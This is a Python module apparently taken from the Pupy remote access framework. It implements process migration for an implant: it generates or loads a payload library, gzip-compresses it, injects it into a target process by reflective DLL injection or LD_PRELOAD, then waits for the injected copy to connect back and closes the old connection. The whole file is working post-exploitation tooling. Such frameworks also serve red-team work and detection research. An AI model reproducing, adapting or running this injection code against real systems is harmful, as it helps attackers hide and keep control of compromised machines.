from __future__ import absolute_import
from __future__ import division
from __future__ import print_function
from __future__ import unicode_literals

from pupylib.cli import pupygen
import time
import gzip

from io import open
import sys

if sys.version_info.major > 2:
    xrange = range
    from io import BytesIO
else:
    from StringIO import StringIO as BytesIO


def has_proc_migrated(client, pid):
    for c in client.pupsrv.clients:
        if all([
            True for x in c.desc if x in [
                "hostname",
                "platform",
                "release",
                "version",
                "macaddr"
            ] and client.desc[x]==c.desc[x]
        ]):
            if int(c.desc["pid"])==pid:
                return c
    return None


def get_payload(module, compressed=True, debug=False, from_payload=None):
    dllbuff = None
    if from_payload:
        with open(from_payload, 'rb') as payload:
            dllbuff = payload.read()

        module.success('Precompiled payload: {}'.format(from_payload))
    else:
        conf = module.client.get_conf()
        dllbuff, _, _ = pupygen.generate_binary_from_template(
            module.log,
            conf, module.client.target, shared=True
        )

    if not compressed:
        return dllbuff

    dllgzbuf = BytesIO()
    gzf = gzip.GzipFile('pupy.so', 'wb', 9, dllgzbuf)
    gzf.write(dllbuff)
    gzf.close()

    return dllgzbuf.getvalue()


def wait_connect(module, pid, timeout=10):
    module.success("waiting for a connection from the DLL ...")
    for x in xrange(timeout):
        c = has_proc_migrated(module.client, pid)
        if c:
            module.success("got a connection from migrated DLL !")
            c.pupsrv.move_id(c, module.client)
            time.sleep(0.5)
            try:
                module.success("exiting old connection")
                module.client.conn.exit()
                module.success("exited old connection")
            except Exception:
                pass

            break

        time.sleep(1)


def ld_preload(module, command, wait_thread=False, keep=False, debug=False, from_payload=None):
    payload = get_payload(module, debug, from_payload=from_payload)

    pid = module.client.conn.modules['pupy'].ld_preload_inject_dll(
        command, payload, wait_thread
    )

    if pid == -1:
        module.error('Inject failed')
        return
    else:
        module.success('Process created: {}'.format(pid))

    if not keep:
        wait_connect(module, pid)

    module.success("migration completed")


def migrate(module, pid, keep=False, timeout=10, debug=False, from_payload=None):
    payload = get_payload(module, debug, from_payload=from_payload)

    r = module.client.conn.modules['pupy'].reflective_inject_dll(
        pid, payload
    )

    if r:
        module.success("DLL injected !")
    else:
        module.error("Injection failed !")
        return

    if not keep:
        wait_connect(module, pid, timeout=timeout)

    module.success("migration completed")
